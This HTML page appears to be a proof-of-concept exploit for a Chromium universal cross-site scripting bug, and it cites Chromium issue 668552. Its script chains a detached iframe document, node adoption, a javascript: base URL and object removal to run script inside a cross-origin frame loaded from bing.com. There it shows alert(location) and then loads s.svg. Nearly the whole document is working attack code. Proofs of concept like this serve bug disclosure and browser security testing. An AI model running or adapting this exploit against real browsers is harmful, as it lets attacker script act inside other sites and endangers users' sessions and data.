<!DOCTYPE html>
<base href="javascript:top.f();//"></base>
<object name="privateScriptController"></object>
<object data="#"></object>
<script>
  if (location.protocol == 'file:') {
    throw alert('HTTP server is required.');
  }

  function f() {
    document.getElementsByName('privateScriptController')[0].remove();
    frames[0].document.documentElement.appendChild(c);
  }
  // https://bugs.chromium.org/p/chromium/issues/detail?id=668552
  var i = document.documentElement.appendChild(document.createElement('iframe'));
  var d = i.contentDocument;
  i.remove();

  var c = d.documentElement.appendChild(d.createElement('div'));
  var m = c.appendChild(d.createElement('marquee'));
  var i0 = c.appendChild(d.createElement('iframe'));
  var i1 = c.appendChild(d.createElement('iframe'));

  m.setAttribute('class', 'a');
  document.adoptNode(c);
  console.log(i1)
  i1.onload = function () {
    console.log(i1.contentDocument)
    try {
      i1.contentDocument;
      console.log(i1.contentDocument)
    } catch (e) {
      i1.onload = null;
      i1.src = 'javascript:alert(location)';
      document.querySelector('base').remove();
      document.documentElement.appendChild(document.createElement('iframe')).src = 's.svg';
    }
  }

  i1.src = 'https://www.bing.com';
</script>